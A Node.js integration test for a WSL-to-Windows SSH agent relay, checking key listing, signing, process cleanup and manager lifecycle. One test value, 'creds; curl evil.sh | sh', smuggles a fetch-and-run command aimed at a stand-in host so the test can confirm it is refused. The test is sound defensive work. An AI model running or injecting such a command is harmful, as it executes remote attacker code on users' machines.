// Integration test: the SSH agent, reached from INSIDE WSL, through the real `creds relay`.
//
//   npm run compile && node scripts/wsl-agent-relay-itest.cjs
//
// What it proves that no unit test can: that a real `ssh-add -l` and a real `ssh-keygen -Y sign`
// running in a Linux kernel reach an agent that lives in a Windows process, and that the
// signature is one `-Y verify` accepts — which is the exact mechanism `git commit -S` uses with
// `gpg.format ssh`. Asserting that the relay forwarded bytes would prove nothing about whether
// the agent answered; that distinction is what made bridge phase 4a a defect rather than a
// feature (see `src/sshProgram.ts`).
//
// And since E5 (PLAN_wsl_bridge_outlives_its_client.md): that the relay's Windows children end with
// their connections. Ten `ssh-add -l` leave 0 `creds.exe relay-pipe` of this run on Windows and the
// relay's descriptor count back at its baseline (defect C was 27 children and 115 pipe fds under a
// relay with 0 connections); the relay is stopped by its own pid and removes its socket; and the
// manager's `dispose()` — a killed `wsl.exe`, SIGHUP to the relay — takes down a relay holding a LIVE
// connection, its relay-pipe on Windows included.
//
// Every binary it starts is a COPY in this run's own directory (`wslRun.cjs`), and every watch asks by
// executable path under it, on both sides (`wslStrays.cjs`) — so nothing anybody else runs can be
// asserted on or stopped. Nothing is deleted inside the distribution: sockets and scratch files are
// run-unique and left for the next boot.
//
// The private key exists only in this test's own Node process on the Windows side. It is never
// written anywhere, and never crosses into WSL.
//
// Skipped loudly, never silently: no Windows, no WSL, no Windows binary, no .NET SDK or python3
// inside the distribution, or a Linux build that would not build — each prints what fixes it.
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const readline = require('readline');
const { spawn } = require('child_process');

const OUT = path.join(__dirname, '..', 'out');
const { pollUntil, runAndSweep, started, watchLinuxPids, watchWindowsPids } = require('./wslStrays.cjs');
const { run, stepArgv, wslStep, wslExec, asLinux, skip, windowsBuild, runDirectories, copyWindowsBinary, linuxBinary, finishRun } = require('./wslRun.cjs');

const HOLD = asLinux(path.join(__dirname, 'wslHoldSocket.py'));
/** Every watch this run started; the sweep at the bottom walks them. */
const watches = [];
/** This run's directories and copies, once made. */
let dirs;
let windowsCli;
let linuxCli;

const PIPE_NAME = `creds-relay-itest-${process.pid}`;
// Not String.raw: a raw template cannot END in a backslash — it escapes the closing backtick and
// swallows the next line, which is a syntax error two lines further down.
const PIPE_ADDRESS = '\\\\.\\pipe\\' + PIPE_NAME;
/** The plan's "polled up to 5 s": how long a child may take to leave once its connection is gone. */
const GONE_WITHIN_MS = 5_000;
/** The plan's ten. */
const CONNECTIONS = 10;

let failures = 0;
function check(name, ok, detail) {
  console.log(`${ok ? 'ok  ' : 'FAIL'} ${name}${ok || detail === undefined ? '' : ` — ${detail}`}`);
  if (!ok) {
    failures += 1;
  }
}

/** This run's socket for the relay it starts itself, and for the one the manager starts. */
const relaySocket = () => `${dirs.linux}/relay.sock`;
const managedSocket = () => `${dirs.linux}/managed.sock`;
/** A scratch file of this run inside the distribution — never removed, never shared. */
const scratch = (name) => `${dirs.linux}/${name}`;

/**
 * The environment every WSL step needs, as name → value — exported by `wslSteps.sh` after the login profile,
 * never written into a shell line.
 *
 * <p>`WSLENV` is not decoration. Environment variables do NOT cross from WSL into a Windows child
 * — measured 2026-08-26, including from .NET's own `ProcessStartInfo.Environment` — so without
 * naming it here the Windows half would read the real VS Code endpoint directory instead of this
 * test's. `/p` asks WSL to translate the path on the way through. `CREDS_LOG_DIR` crosses the same
 * way, so neither half writes into the person's real log folder.</p>
 */
function wslEnv(endpointDir, socket = relaySocket()) {
  return {
    CREDS_ENDPOINT_DIR: asLinux(endpointDir),
    CREDS_LOG_DIR: asLinux(dirs.logs),
    WSLENV: 'CREDS_ENDPOINT_DIR/p:CREDS_LOG_DIR/p',
    CREDS_WINDOWS_BINARY: asLinux(windowsCli),
    CREDS_RELAY_SOCKET: socket,
    SSH_AUTH_SOCK: socket,
  };
}

/** `ssh-add -l` through the relay, in a login shell with exactly these exports. */
const sshAddList = (env) => wslStep(env, 'exec', ['ssh-add', '-l']);
/** Its last line, both streams — what a person reads when the agent is gone. */
const sshAddLastLine = (env) => wslStep(env, 'last-line', ['ssh-add', '-l']);

/** Everything this harness needs before it may start anything; skips loudly when one is missing. */
async function preconditions() {
  if (process.platform !== 'win32') {
    skip('this bridge only exists on Windows — elsewhere ssh reaches the agent directly');
  }
  if ((await run('wsl.exe', ['-l', '-q'])).code !== 0) {
    skip('no WSL on this machine');
  }
  if (!fs.existsSync(path.join(windowsBuild('src_cli'), 'creds.exe'))) {
    skip('the Windows CLI is not built', 'run: dotnet build src_cli/src/CredsCli.csproj');
  }
  const tools = await wslStep({}, 'tools', ['dotnet', 'python3', 'ssh-add', 'ssh-keygen']);
  if (tools.stdout.includes('missing')) {
    skip(`inside WSL: ${tools.stdout.trim()}`, 'install it in the distribution, then re-run');
  }
}

/** This run's copies: the Windows CLI into the Windows run directory, the Linux build into the Linux one. */
async function prepareBinaries() {
  dirs = runDirectories();
  windowsCli = copyWindowsBinary(dirs, { kind: 'cli', project: 'src_cli', exe: 'creds.exe' });
  linuxCli = await linuxBinary(dirs, {
    kind: 'cli',
    project: 'src_cli',
    projects: ['src_cli', 'src_broker_client', 'src_service_defaults'],
    exe: 'creds',
  });
  if (linuxCli === undefined) {
    skip('the Linux CLI could not be built inside WSL');
  }
  console.log(`      run directories: ${dirs.windows} and ${dirs.linux}`);
}

/** A real agent on a named pipe, serving one key that lives only in this process. */
function startAgent(parsed, socketPath, onAsk) {
  const { SshAgentServer } = require(path.join(OUT, 'sshAgentServer.js'));
  const { signForAgent } = require(path.join(OUT, 'sshAgentSign.js'));
  return new SshAgentServer({
    socketPath,
    keys: () => [
      {
        entityId: 'e-wsl-itest',
        name: 'wsl relay itest',
        fingerprint: parsed.key.fingerprint,
        identity: { publicBlob: parsed.key.publicBlob, comment: 'wsl relay itest' },
        sign: (data, flags) => signForAgent(parsed.key, data, flags),
      },
    ],
    confirm: () => {
      onAsk();
      return Promise.resolve(true);
    },
    log: () => undefined,
  });
}

/** The announcement the relay discovers the agent through. */
function announce(endpointDir, agentSocket) {
  fs.writeFileSync(
    path.join(endpointDir, 'window-4242.json'),
    JSON.stringify({ pid: 4242, port: 1, startedAt: new Date().toISOString(), agentSocket }),
  );
}

/**
 * The relay, started as a child of THIS process — no `nohup … &` job, so nothing has to find it by name
 * later: its first stdout line names the socket, its stderr is kept (the connection lines are the positive
 * control that a relay-pipe was really started for each connection), and it is stopped by its own pid.
 */
function startRelay(env) {
  const child = spawn('wsl.exe', stepArgv(env, 'exec', [linuxCli, 'relay']), { stdio: ['ignore', 'pipe', 'pipe'] });
  const stderr = [];
  readline.createInterface({ input: child.stderr }).on('line', (line) => stderr.push(line));
  const firstLine = new Promise((resolve) => {
    readline.createInterface({ input: child.stdout }).once('line', resolve);
    child.on('exit', () => resolve(''));
    setTimeout(() => resolve(''), 30_000).unref();
  });
  return { child, stderr, firstLine };
}

/** How many of the relay's connection lines say a relay-pipe was opened, and how many say it ended. */
function connectionLines(stderr) {
  return {
    // `still running: false` — the logger renders the message with `j`, so a bool is JSON, lower-case.
    opened: stderr.filter((line) => /connection \d+ opened; relay-pipe pid \d+/.test(line)).length,
    ended: stderr.filter((line) => /connection \d+ ended .*still running: false/i.test(line)).length,
  };
}

/** Poll `read()` until it answers `wanted` or `ms` has passed; answers the last value read. */
const backTo = (read, wanted, ms) => pollUntil(read, (value) => value === wanted, ms);

/**
 * A connection held open on `socket` by `wslHoldSocket.py` inside the distribution — a client that says nothing,
 * for which the relay starts a `relay-pipe` on Windows and keeps it. `held` answers `held` once connected;
 * `release()` closes the holder's stdin, which is how it leaves (nothing signals it).
 */
function holdConnection(socket) {
  const holder = spawn('wsl.exe', ['-e', 'python3', HOLD, socket], { stdio: ['pipe', 'pipe', 'inherit'] });
  const held = new Promise((resolve) => {
    readline.createInterface({ input: holder.stdout }).once('line', resolve);
    holder.on('exit', () => resolve(''));
    setTimeout(() => resolve(''), 10_000).unref();
  });
  return { held, release: () => holder.stdin.end() };
}

/** The Windows watch can see a relay-pipe of THIS run — without this, "0 relay-pipe" would pass with a blind watch. */
async function theWatchSeesARelayPipe(socket, windowsHalves) {
  const holder = holdConnection(socket);
  try {
    check('a connection is held open on the relay', (await holder.held) === 'held');
    const serving = await windowsHalves.seenWithin(1, 10_000);
    check('a creds.exe relay-pipe of this run serves it on Windows (the positive control)', serving.length === 1, `saw ${JSON.stringify(serving)}`);
  } finally {
    holder.release();
  }
  const gone = await windowsHalves.goneWithin(GONE_WITHIN_MS);
  check('and it is gone within 5 s of the connection\'s end', gone.length === 0, windowsHalves.describe(gone));
}

/** Ten connections through the relay; afterwards nothing of theirs may be left on either side. */
async function tenConnections(env, fingerprint, relay, relayPid, windowsHalves, linuxSide) {
  const baseline = await linuxSide.fdCount(relayPid);
  check('the relay\'s descriptor count can be read for the baseline', Number.isInteger(baseline), String(baseline));
  const before = connectionLines(relay.stderr);

  let listed = 0;
  for (let i = 0; i < CONNECTIONS; i += 1) {
    const one = await sshAddList(env);
    listed += one.stdout.includes(fingerprint) ? 1 : 0;
  }
  check(`${CONNECTIONS} ssh-add -l in a row each list the key`, listed === CONNECTIONS, `${listed} of ${CONNECTIONS}`);

  const opened = await backTo(() => Promise.resolve(connectionLines(relay.stderr).opened - before.opened), CONNECTIONS, GONE_WITHIN_MS);
  check(`the relay started a relay-pipe for each of them (its own connection lines)`, opened === CONNECTIONS, `${opened} connection lines`);
  const left = await windowsHalves.goneWithin(GONE_WITHIN_MS);
  check(`0 new creds.exe relay-pipe of this run on Windows within 5 s`, left.length === 0, windowsHalves.describe(left));
  const after = await backTo(() => linuxSide.fdCount(relayPid), baseline, GONE_WITHIN_MS);
  check(`the relay's descriptor count is back at its baseline (${baseline})`, after === baseline, `now ${after}`);
  const ended = await backTo(() => Promise.resolve(connectionLines(relay.stderr).ended - before.ended), CONNECTIONS, GONE_WITHIN_MS);
  check(`and the relay's own lines say each of the ${CONNECTIONS} children had exited`, ended === CONNECTIONS, `${ended} ended lines; last: ${JSON.stringify(relay.stderr.slice(-2))}`);
}

/** Through the real `envPrefix`, in a shell that does NOT export SSH_AUTH_SOCK — with its control. */
async function throughThePrefix(endpointDir, fingerprint) {
  // Everything above proves the RELAY, which shipped in August. This proves what `sshConnect` now
  // posts into a WSL terminal: `env SSH_AUTH_SOCK='<socket>' <command>`, generated by the REAL
  // `envPrefix` rather than written out here, and run in a shell that does NOT export
  // SSH_AUTH_SOCK — so the prefix is the only thing that could be reaching the agent. The control
  // underneath is what makes that a measurement rather than a hope.
  const { envPrefix } = require(path.join(OUT, 'wslRelay.js'));
  const prefix = envPrefix('SSH_AUTH_SOCK', relaySocket());
  check(
    'the connect path composes an env WORD, not the bare assignment fish and pwsh reject',
    prefix.startsWith("env SSH_AUTH_SOCK='") && prefix.endsWith("' "),
    prefix,
  );
  const bare = Object.fromEntries(Object.entries(wslEnv(endpointDir)).filter(([name]) => name !== 'SSH_AUTH_SOCK'));
  // The one composed shell line in these harnesses, and it is the SUBJECT: the product's own `envPrefix` output,
  // run by a real shell exactly as a terminal would run it — handed to `bash -c` as one argv entry.
  const throughPrefix = await wslStep(bare, 'exec', ['bash', '-c', `${prefix}ssh-add -l`]);
  check(
    'that composed line reaches the agent in a REAL WSL shell',
    throughPrefix.stdout.includes(fingerprint),
    `${throughPrefix.stdout.trim()}${throughPrefix.stderr.trim()}`,
  );
  const withoutPrefix = await sshAddList(bare);
  check(
    'and the same shell WITHOUT it reaches nothing — so the prefix is what did the work',
    !withoutPrefix.stdout.includes(fingerprint),
    `${withoutPrefix.stdout.trim()}${withoutPrefix.stderr.trim()}`,
  );
}

/** The agent unloaded and loaded again at a new address: the same relay must find it. */
async function agentReloaded(env, endpointDir, parsed, server) {
  // The Windows half resolves the agent's address on EVERY connection rather than once when the
  // relay starts. The agent runs only while a key is loaded, so a person who unloads a key and
  // loads another gets a different pipe — and a relay holding a startup snapshot would serve a
  // name whose server is gone, which on Windows is indistinguishable from one that never was.
  // Nothing below restarts the relay.
  server.dispose();
  const whileDown = await sshAddLastLine(env);
  check(
    'with the agent unloaded the relay reports it rather than hanging',
    !whileDown.stdout.includes(parsed.key.fingerprint),
    whileDown.stdout.trim(),
  );
  const restarted = startAgent(parsed, `${PIPE_ADDRESS}-again`, () => undefined);
  await restarted.listen();
  announce(endpointDir, `${PIPE_ADDRESS}-again`);
  const afterRestart = await sshAddLastLine(env);
  check(
    'a key loaded again is found by the SAME relay, at a new address',
    afterRestart.stdout.includes(parsed.key.fingerprint),
    afterRestart.stdout.trim(),
  );
  return restarted;
}

/** The relay stopped by its own pid, through a pidfd, after its path is re-read: it leaves, and so does its socket. */
async function relayStoppedByPid(env, fingerprint, relay, relayPid, linuxSide) {
  const stopped = await linuxSide.stop([String(relayPid)]);
  check('the relay is stopped by its own pid, never by name', stopped.includes(String(relayPid)), `stopped ${JSON.stringify(stopped)}`);
  const left = await linuxSide.goneWithin(GONE_WITHIN_MS);
  check('and it is gone within 5 s', left.length === 0, linuxSide.describe(left));
  const socketLeft = (await wslExec(['test', '-e', relaySocket()])).code === 0;
  check('it removed its socket on the way out', !socketLeft, `${relaySocket()} still exists`);
  // Bounded: a stop that did not take must become a failed check, never a harness that hangs before its sweep.
  const exited = await new Promise((resolve) => {
    if (relay.child.exitCode !== null || relay.child.signalCode !== null) {
      resolve(true);
      return;
    }
    const bound = setTimeout(() => resolve(false), 10_000);
    relay.child.once('exit', () => {
      clearTimeout(bound);
      resolve(true);
    });
  });
  check('and its wsl.exe on this side has exited', exited, 'still running 10 s after the stop');
  const afterStop = await sshAddLastLine(env);
  check('with the relay gone the socket answers nothing', !afterStop.stdout.includes(fingerprint), afterStop.stdout.trim());
}

/**
 * The extension's half: the manager raises a relay and lowers it — and lowering it takes down a LIVE
 * connection's relay-pipe on Windows, which is the relay's SIGHUP path on the real bridge.
 */
async function theManager(endpointDir, parsed, windowsHalves, linuxSide) {
  const { WslRelayManager, spawnWslRelay } = require(path.join(OUT, 'wslRelayManager.js'));
  // The manager's own `wsl.exe` carries no shell exports; these cross from this process's environment through
  // WSLENV — the socket as a Linux path (no `/p`), the two directories translated on the way in and out again.
  process.env.CREDS_ENDPOINT_DIR = endpointDir;
  process.env.CREDS_LOG_DIR = dirs.logs;
  process.env.CREDS_RELAY_SOCKET = managedSocket();
  process.env.WSLENV = 'CREDS_ENDPOINT_DIR/p:CREDS_LOG_DIR/p:CREDS_RELAY_SOCKET';

  const agent = startAgent(parsed, `${PIPE_ADDRESS}-managed`, () => undefined);
  await agent.listen();
  announce(endpointDir, `${PIPE_ADDRESS}-managed`);

  const DEFAULT_DISTRO = '';
  const managerLog = [];
  const manager = new WslRelayManager(
    (args) => spawnWslRelay(args, (text) => managerLog.push(text)),
    (message) => managerLog.push(message),
  );
  // `['']` is the DEFAULT distribution, not an empty list: `start` takes an array of distribution
  // names and an empty name means "whatever wsl.exe would pick" (the API drift of 2026-09-06 that
  // crashed this harness, recorded in research/module_tests.md). The third argument is the Windows
  // half the relay must start — this run's copy, so the Windows watch can see it — as the distribution
  // sees it: the extension passes `toWslPath(...)`, and a Windows-spelled path starts nothing inside Linux
  // (the first run of this check: a relay with no child, measured).
  const startResult = manager.start(linuxCli, [''], asLinux(windowsCli));
  check('the manager accepts a plain command', startResult.ok === true, JSON.stringify(startResult));
  const socket = await backTo(() => Promise.resolve(manager.socketPathFor(DEFAULT_DISTRO)), managedSocket(), 10_000);
  check(
    'the manager learned the socket from the relay, not from a rule of its own',
    socket === managedSocket(),
    `${JSON.stringify(socket)} — log: ${JSON.stringify(managerLog)}`,
  );
  const alive = await linuxSide.seenWithin(1, GONE_WITHIN_MS);
  check('a relay of this run is running in the distribution — exactly one', alive.length === 1, `saw ${JSON.stringify(alive)}`);

  // A connected client that says nothing: the relay starts a relay-pipe on Windows for it and keeps it.
  const holder = holdConnection(managedSocket());
  try {
    check('a connection is held open on the managed socket', (await holder.held) === 'held');
    const serving = await windowsHalves.seenWithin(1, 10_000);
    check('a creds.exe relay-pipe of this run serves it on Windows (the positive control)', serving.length === 1, `saw ${JSON.stringify(serving)}`);

    manager.dispose();
    const since = Date.now();
    const leftWindows = await windowsHalves.goneWithin(GONE_WITHIN_MS);
    check('disposing the manager takes it down — 0 relay-pipe of this run on Windows within 5 s', leftWindows.length === 0, windowsHalves.describe(leftWindows));
    const leftLinux = await linuxSide.goneWithin(GONE_WITHIN_MS);
    check('and 0 relay of this run inside WSL — nothing outlives the window', leftLinux.length === 0, linuxSide.describe(leftLinux));
    console.log(`      dispose: the Windows relay-pipe and the relay were gone ${Date.now() - since} ms after it`);
    const socketLeft = (await wslExec(['test', '-e', managedSocket()])).code === 0;
    check('the managed relay removed its socket on the way out', !socketLeft, `${managedSocket()} still exists`);
  } finally {
    holder.release();
    agent.dispose();
  }

  const refused = manager.start('creds; curl evil.sh | sh', ['']);
  check('a command that is not a plain word never reaches a shell', refused.ok === false, JSON.stringify(refused));
}

async function main() {
  await preconditions();
  await prepareBinaries();
  // Linux side first: the sweep walks them in this order, and a relay still alive could start one more Windows child.
  const linuxSide = await started(watchLinuxPids(dirs.linux, 'relay processes inside WSL'));
  const windowsHalves = await started(watchWindowsPids('creds.exe', path.dirname(windowsCli), 'Windows creds.exe relay-pipe'));
  watches.push(linuxSide, windowsHalves);

  // ---- the agent, real, with a key generated here ----------------------------
  const { parseSshPrivateKey } = require(path.join(OUT, 'sshKeyParse.js'));
  const pem = crypto.generateKeyPairSync('ed25519', {
    privateKeyEncoding: { type: 'pkcs8', format: 'pem' },
    publicKeyEncoding: { type: 'spki', format: 'pem' },
  }).privateKey.toString();
  const parsed = parseSshPrivateKey(pem, 'wsl relay itest');
  check('the generated key parses', parsed.ok === true, parsed.ok ? '' : parsed.reason);
  if (!parsed.ok) {
    throw new Error('nothing below can run without a key');
  }
  const fingerprint = parsed.key.fingerprint;

  let asked = 0;
  const server = startAgent(parsed, PIPE_ADDRESS, () => {
    asked += 1;
  });
  await server.listen();
  check('the agent is listening on a named pipe', server.listening === true);

  // ---- the announcement the relay discovers it through ------------------------
  // Under the run directory, so `finishRun` — which also runs after a failure — is the only removal there is.
  const endpointDir = path.join(dirs.windows, 'announcements', 'endpoints');
  fs.mkdirSync(endpointDir, { recursive: true });
  announce(endpointDir, PIPE_ADDRESS);

  const env = wslEnv(endpointDir);
  const relay = startRelay(env);
  const firstLine = await relay.firstLine;
  check('the relay names its socket on its first stdout line', firstLine === `export SSH_AUTH_SOCK=${relaySocket()}`, JSON.stringify(firstLine));
  const relays = await linuxSide.seenWithin(1, GONE_WITHIN_MS);
  check('exactly one process of this run is alive inside WSL — the relay', relays.length === 1, `saw ${JSON.stringify(relays)}`);
  const relayPid = relays[0];

  const mode = await wslStep({}, 'exec', ['stat', '-c', '%a', relaySocket()]);
  check('the relay opened a socket only its owner can reach', mode.stdout.trim() === '600', mode.stdout.trim());

  // ---- what the whole thing is for -------------------------------------------
  const listed = await sshAddList(env);
  check(
    'ssh-add INSIDE WSL lists a key that lives in a Windows process',
    listed.stdout.includes(fingerprint),
    `${listed.stdout.trim()}${listed.stderr.trim()}`,
  );
  check('listing raised no dialog', asked === 0, `asked ${asked}`);
  // That first connection warmed the relay up — the descriptors a .NET host opens the first time it starts a
  // child (its SIGCHLD plumbing) are permanent — so the baseline is taken after it, and the ten follow; between
  // them, the proof that the Windows watch can see a relay-pipe of this run at all.
  const warm = await windowsHalves.goneWithin(GONE_WITHIN_MS);
  check('the first connection\'s relay-pipe is gone before the ten begin', warm.length === 0, windowsHalves.describe(warm));
  await theWatchSeesARelayPipe(relaySocket(), windowsHalves);
  await tenConnections(env, fingerprint, relay, relayPid, windowsHalves, linuxSide);

  const pub = scratch('itest.pub');
  const payload = scratch('itest.txt');
  const signed = await wslStep(env, 'sign', [pub, payload]);
  check(
    'ssh-keygen -Y sign produced a signature through the relay',
    signed.stdout.includes('Write signature'),
    `${signed.stdout.trim()}${signed.stderr.trim()}`,
  );
  check('signing asked the human exactly once', asked === 1, `asked ${asked}`);

  const verified = await wslStep(env, 'verify', [pub, payload, scratch('itest.allowed')]);
  await throughThePrefix(endpointDir, fingerprint);
  check(
    'ssh-keygen -Y verify accepts it — the mechanism git commit -S uses',
    verified.stdout.includes('Good "file" signature'),
    `${verified.stdout.trim()}${verified.stderr.trim()}`,
  );

  // ---- the design decision this exists to justify -----------------------------
  const restarted = await agentReloaded(env, endpointDir, parsed, server);
  restarted.dispose();

  // ---- the lifecycle rules ----------------------------------------------------
  // The refusal line, found by its words rather than by being LAST: since the relay logs through the
  // shared logger (2026-10-09) its exit line follows the refusal on stderr.
  const second = await wslStep(env, 'exec', [linuxCli, 'relay']);
  const secondSaid = `${second.stdout}${second.stderr}`;
  check('a second relay refuses a socket someone is already serving', secondSaid.includes('already served by a live relay'), secondSaid.trim().slice(-300));
  await relayStoppedByPid(env, fingerprint, relay, relayPid, linuxSide);

  // ---- the extension's half: it raises and lowers the relay for you ------------
  await theManager(endpointDir, parsed, windowsHalves, linuxSide);
}

// The sweep runs whatever happened — a run that failed partway must not hand its processes to the
// next one — and then the Windows run directory is removed by its exact name.
runAndSweep({
  main,
  strays: () => watches,
  failures: () => failures,
  finish: () => (dirs === undefined ? Promise.resolve() : finishRun(dirs)),
  label: 'WSL relay',
});
